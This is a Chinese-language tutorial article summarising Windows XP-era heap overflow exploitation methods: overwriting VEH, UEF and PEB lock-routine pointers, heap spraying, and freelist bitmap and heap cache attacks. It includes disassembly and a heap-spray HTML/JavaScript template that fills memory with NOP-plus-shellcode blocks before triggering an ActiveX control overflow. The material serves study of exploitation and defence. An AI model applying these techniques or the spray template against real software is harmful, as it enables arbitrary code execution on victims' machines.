
# windows 堆溢出利用方式总结

> 原文：[`www.pediy.com/kssd/pediy11/125591.html`](https://www.pediy.com/kssd/pediy11/125591.html)

Title ：windows 堆溢出利用方式总结  

Author：riusksk(泉哥)  

Blog  ：[`riusksk.blogbus.com`](http://riusksk.blogbus.com)

## 一、利用 VEH

向量化异常处理（VEH，Vectored Exception Handling）最初是在 XP 中公布，它的优先级高于 SEH，并且 VEH 是存在堆中的，它是你在代码中明确添加的，并不伴随 try/catch 之类的语句而产生，它也需要通过 API（`AddVectoredExceptionHandler`）来注册回调函数，并可注册多个 VEH，各个 VEH 结构体之间串成双向链表，因此比 SEH 多了一个前后指针，其它更详细的信息可参考《Windows XP 中的向量化异常处理》一文：[`bbs.pediy.com/showthread.php?t=49868`](http://bbs.pediy.com/showthread.php?t=49868)。每一个 VEH 结构均存储在堆上，其结构如下：

```
struct _VECTORED_EXCEPTION_NODE
{
    DWORD   m_pNextNode;    //指向下一个_VECTORED_EXCEPION_NODE 结构,因此可用伪造的指针来覆盖它
    DWORD   m_pPreviousNode;    //指向上一个_VECTORED_EXCEPION_NODE 结构
    PVOID   m_pfnVectoredHandler;  //异常处理函数
}
```

负责分发`_VECTORED_EXCEPION_NODE`的代码如下：

```
77F7F49E   8B35 1032FC77    MOV ESI,DWORD PTR DS:[77FC3210]  ;赋值后 ESI 指向_VECTORED_EXCEPION_NODE 结构，即 m_pNextNode
77F7F4A4   EB 0E            JMP SHORT ntdll.77F7F4B4
77F7F4A6   8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
77F7F4A9   50               PUSH EAX
77F7F4AA   FF56 08          CALL DWORD PTR DS:[ESI+8]    ;可用 shellcode-0x8 去覆盖 m_pNextNode 指针
```

接着我们在堆中确定 shellcode 地址，可先用垃圾字符去填充，比如`0x41`，然后在堆中搜索它。当发生堆溢出时，堆块的前向指针和后向指针就会被篡改，比如异常出现在：

```
MOV DWORD PTR DS:[ECX],EAX  ;EAX = Flink = 写入的内容
MOV DWORD PTR DS:[EAX+4],ECX  ;ECX = Blink = 写入的地址
```

那么我们就可以用 `m_pNextNode-4` 来覆盖 `ECX`，然后用 `shellcode-8` 去覆盖 `EAX`。关于 `m_pNextNode` 指针的获取，我们只需在触发异常后，按 shift+F7 步过异常即可找到此指针，比如以下代码：

```
77F60C2C   BF 1032FC77      MOV EDI,ntdll.77FC3210    ;m_pNextNode 指针
77F60C31   393D 1032FC77    CMP DWORD PTR DS:[77FC3210],EDI
77F60C37   0F85 48E80100    JNZ ntdll.77F7F485
```

关于 `EAX` 和 `ECX` 的偏移地址可通过 `pattern_create` 和 `pattern_offset` 来获取。这样当触发异常时就会调用 VEH，而此时下一个 VEH 结构即是我们特意构造的 shellcode，这样我们的恶意代码就有可以被执行了。

## 二、利用 UEF

系统默认异常处理函数（UEF，Unhandler Exception Filter）是系统处理异常时最后调用的一个异常处理例程，在堆溢出中，只需将这一地址覆盖为我们的 shellcode 地址即可。获取 UEF 地址的方法可以通过查看 `SetUnhandledExceptionFilter()`的代码来定位，接着再找到操作 `UnhandledExceptionFilter` 指针的 MOV 指令，比如以下代码：

```
77E93114   A1 B473ED77      MOV EAX,DWORD PTR DS:[77ED73B4]  ;UnhandledExceptionFilter 指针
77E93119   3BC6             CMP EAX,ESI
77E9311B   74 15            JE SHORT kernel32.77E93132
77E9311D   57               PUSH EDI
77E9311E   FFD0             CALL EAX
```

现在我们只需找到 shellcode 地址，或者看是否有某一寄存器 `reg` 刚好指向 shellcode 或其附近，然后用 shellcode 地址或者类似 `call [reg + offset]`的指令地址来覆盖 `UnhandledExceptionFilter` 指针，比较常用的指令如：

```
call dword ptr ds:[edi+74]
call dword ptr ds:[esi+4c]
```

其它 `eax`、`ebx` 也有可能指向堆，亦可作为跳板来用。

## 三、利用 PEB

由于当 UEF 被调用后，它最终会调用 `ExitProcess()`来结束程序，而它在清理现场时需要进入临界区以同步线程，因此会调用 `RtlEnterCriticalSection()` t 和 `RtlLeaveCriticalSection()`。`ExitProcess` 是通过存放在 PEB 中的一对指针来调用这两个函数的，如果能够利用 DWORD SHOOT 把这对指针篡改成 shellcode 入口地址，那么在程序结束调用 `ExitProcess()`就会执行 shellcode。下面是在 Windows XP SP3 下 PEB 的情况：

```
0:000> dt _PEB
ntdll!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 SpareBool        : UChar
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : Ptr32 Void
   +0x018 ProcessHeap      : Ptr32 Void
   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION  //根据此指针来间接进入临界区  
   +0x020 FastPebLockRoutine : Ptr32 Void
   +0x024 FastPebUnlockRoutine : Ptr32 Void
   +0x028 EnvironmentUpdateCount : Uint4B
   ……
```

但在 WinXP SP2 之后微软就加入了 PEB random 保护，不再使用固定的 PEB 基址，而使用具有一定随机性的 PEB 基址，以提高利用的难度。

## 四、Heap Spary

Heap Spary 技术最早是由 SkyLined 于 2004 年为 IE 的 iframe 漏洞写的 exploit 而使用到新技术，目前主要作为浏览器攻击的经典方法，被大量网马所使用。Heap Spary 技术是使用 js 分配内存，所分配的内存均放入堆中，然后用各带有 shellcode 的堆块去覆盖一大片内存地址，Javascript 分配内存从低址向高址分配，申请的内存空间超出了 200M，即大于了 `0x0C0C0C0C` 时，`0x0C0C0C0C` 就会被覆盖掉，因此只要让 IE 执行到 `0x0C0C0C0C`（有时也会用 `0x0D0D0D0D` 这一地址）就可以执行 shellcode，这些堆块可以用 NOP + shellcode 来填充，每块堆构造 1M 大小即可，当然这也不是固定。这样当 nop 区域命中 `0x0c0c0c0c` 时，就可执行在其后面的 shellcode。下面是一个简单模板：

```
<html>
<body>
<object classid="clsid:6BE52E1D-E586-474F-A6E2-1A85A9B4D9FB" id="target"></object>  
<script>
Var shellcode="\\u68fc\\u7473\\u6668\\u6961……\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857";
var nop="\\u9090\\u9090";
while (nop.length <= 0x100000/2)
{
  nop+=nop;
}
nop = nop.substring(0,0x100000/2-32/2-4/2-shellcode.length-2/2);
var slide = new Array();
for ( var i=0; i<200; i++)
{
  slide[i] = nop + shellcode;
}
var s= '';
while (s.length < 748)
{
  s+="\\x0c";  
}
target.Overflow(s);
</script>
</body>
</html>
```

## 五、Bitmap Flipping Attack

在 Heap Management 结构中包含有 Freelist Bitmap 标志位，它是一个 4 字节的 DWORD 值，当对应的 `FreeList[n]`被填充时，bitmap 就将被设置。当请求分配堆块时，它会先搜索与之大小合适的 `FreeList[n]`，然后检测对应的 bitmap，若上面为 0 就表示上面是块未使用的空闲块，则对应的 `FreeList[n]`将用于分配配块，接着返回到对应的请求块 `FreeList[n]`指向的地址。因此如果我们可以控制 Bitmap，并能够覆盖 `freelist[n]`中的值，那么我们就可以通过它来执行任意代码。更多信息可参见 Ruxcon 2008 大会上面的文章《Heaps About Heaps》

## 六、Heap Cache Attack

Heap Cache 主要用于降低频繁遍历 `FreeList[0]`的性能消耗，以提高性能。它主要是为 `FreeList[0]`中的堆块创建扩展索引，更重要的是，Heap Manager 并没有将任何空闲块移动缓存中，这些空闲块一直保存在 `FreeList[0]`中，但缓存中保存着一些指针，它们指向 `FreeList[0]`中的某些节点，以此来提升访问 `FreeList[0]`的速度。堆缓存是一个 bucket 数组，每一个 bucket 包含有 `intptr_t` 字节用于存储大小，还有一个 NULL 指针或者 `FreeList[0]`上的堆块指针。默认情况下，数组包括有 896 个 bucket，其大小在 1024 和 8192 之间，但大小是可配置的，我们可指定最大的缓存索引号。在堆缓存攻击技术中又存在各种利用方式，比如 De-synchronization Attack（通过覆写堆块头信息中的大小域，使每次请求同等大小堆块时都指向同一块已经使用的内存块，如果攻击者可能控制这一内存块中的内容，就有可能导致任意代码执行），Insert Attack、Existing Attacks、Malicious Cache Entry Attack……这些方法有很大的局限性，在实际运用上很难派上用场，若想获取更多关于这方面的信息可以参见 BlackHat USA 2009 上面的文章《Practical Windows XP/2003 Heap Exploitation》。

## 七、Bitmap XOR Attack

Bitmap XOR Attack 是通过异或操作来更改 freelist bitmap，如果系统尝试清除这一错误的标志位，那么就可能从一个空闲位（free bit）切换到设置位(set bit)，进而实现类似上文提到的 bitmap attack。这个可以通过篡改堆块头信息中的大小域（`CurSize`），使其小于 `0x80`，接着再使对应堆块中的前向指向与后向指针相等（`flink == blink`），并保证其指向的地址是可读的。更多信息可以参见 BlackHat USA 2009 上面的文章《Practical Windows XP/2003 Heap Exploitation》。后面这几种方法实际利用价值不大，权当了解，学习思路更为重要。
